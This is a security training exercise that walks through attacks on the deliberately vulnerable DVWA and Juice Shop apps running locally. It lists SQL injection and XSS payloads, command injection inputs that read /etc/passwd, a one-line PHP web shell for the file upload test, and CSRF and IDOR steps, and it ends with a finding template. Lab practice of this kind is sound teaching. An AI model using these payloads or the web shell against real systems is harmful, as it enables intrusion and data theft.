# Integration exercise — full security review on DVWA and Juice Shop

Run through all major web vulnerabilities on your local lab. Document each finding.

## Setup

```bash
# Start DVWA (set security to Low for first pass)
docker run -d -p 80:80 vulnerables/web-dvwa
# Login: admin/password → Setup/Reset DB

# Start Juice Shop
docker run -d -p 3000:3000 bkimminich/juice-shop

# Start Burp Suite — proxy all traffic through it
```

## DVWA checklist — run each module at Low security

For each finding, document: vulnerable parameter, payload used, what was returned.

### SQL Injection
```
Input: ' OR 1=1--
Expected: all users returned
Also test: ' UNION SELECT user,password FROM users--
```

### XSS Reflected
```
Input: <script>alert(1)</script> in the name field
Expected: alert box fires
```

### XSS Stored
```
Input: <script>alert(document.cookie)</script> in message field
Expected: alert fires for every visitor
```

### CSRF
```
1. Log in as admin
2. Visit /vulnerabilities/csrf/ — change password form
3. Intercept with Burp — is there a CSRF token in the request?
4. Remove token → resend → does it work?
```

### Command Injection
```
Input: 127.0.0.1; id
Input: 127.0.0.1 && cat /etc/passwd
Expected: command output in response
```

### File Upload
```
Upload: shell.php with content: <?php system($_GET['cmd']); ?>
Access: http://localhost/hackable/uploads/shell.php?cmd=id
```

### IDOR (Insecure Direct Object Reference)
```
1. Log in as user1
2. Find user ID in requests
3. Change to user2's ID
4. Check if user2's data is returned
```

## Juice Shop challenges to complete

- Log in as admin (SQL injection on login)
- Access admin section (IDOR or directory fuzzing)
- View another user's basket (IDOR)
- Post a feedback as another user (parameter tampering)
- Find the confidential document (path traversal or recon)

## After Low — repeat on Medium

```
DVWA Security: Medium
Repeat every test above — observe what blocks, what bypasses work
```

## Finding documentation template

```
Vulnerability: SQL Injection
URL: http://localhost/vulnerabilities/sqli/?id=1
Parameter: id
Payload: ' OR 1=1--
Result: All user records returned
Severity: Critical
Fix: Use parameterized queries
```
